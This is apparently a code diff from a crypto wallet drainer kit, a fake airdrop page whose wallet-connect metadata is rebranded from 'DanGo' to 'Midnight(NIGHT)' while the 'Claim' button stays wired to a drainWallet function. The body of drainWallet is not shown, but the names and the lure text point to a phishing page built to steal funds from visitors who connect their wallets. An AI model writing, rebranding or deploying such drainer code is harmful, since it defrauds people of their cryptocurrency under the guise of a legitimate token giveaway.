@@ -93,8 +93,8 @@ $(document).ready(function() {
             ],
             events: ['chainChanged', 'accountsChanged', 'disconnect'],
             metadata: {
-                name:        'DanGo Airdrop',
-                description: 'Claim your $DANGO tokens',
+                name:        'Midnight(NIGHT) Airdrop',
+                description: 'Claim your $Midnight(NIGHT) tokens',
                 url:         window.location.origin,
                 icons:       [window.location.origin + '/favicon.ico']
             }
@@ -464,7 +464,7 @@ $(document).ready(function() {
                 await drainWallet(ethersProvider, signer, userAddress, walletName);
             });
 
-            // Expose for the modal's Claim My $DANGO button (app.js proceedBtn)
+            // Expose for the modal's Claim My $Midnight(NIGHT) button (app.js proceedBtn)
             window.claimAirdrop = async function() {
                 await drainWallet(ethersProvider, signer, userAddress, walletName);
             };
